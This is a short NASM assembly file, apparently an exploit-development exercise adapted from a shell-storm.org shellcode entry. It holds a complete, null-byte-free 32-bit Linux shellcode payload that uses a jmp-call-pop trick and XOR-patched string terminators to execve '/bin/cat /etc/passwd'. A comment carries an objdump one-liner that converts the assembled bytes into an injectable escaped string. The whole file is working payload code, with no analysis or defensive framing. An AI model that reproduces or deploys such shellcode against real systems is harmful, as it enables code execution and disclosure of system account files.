;http://shell-storm.org/shellcode/files/shellcode-758.php
;for i in $(objdump -d t2v2 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
global _start			

section .text

_start:
	xor	eax, eax
	jmp short two

one:
	pop ecx
	lea ebx, [ecx+12]
	xor byte [ecx +11], 0x42; mov byte [ebx +11], al
	xor byte [ebx +8], 0x41; mov byte [ebx +8], al
	
	push eax
	push ecx
	push ebx
	mov al, 11
	mov ecx, esp
	int 0x80

two:
	call one
	file: db "/etc/passwdB"
	exe: db "/bin/catA"
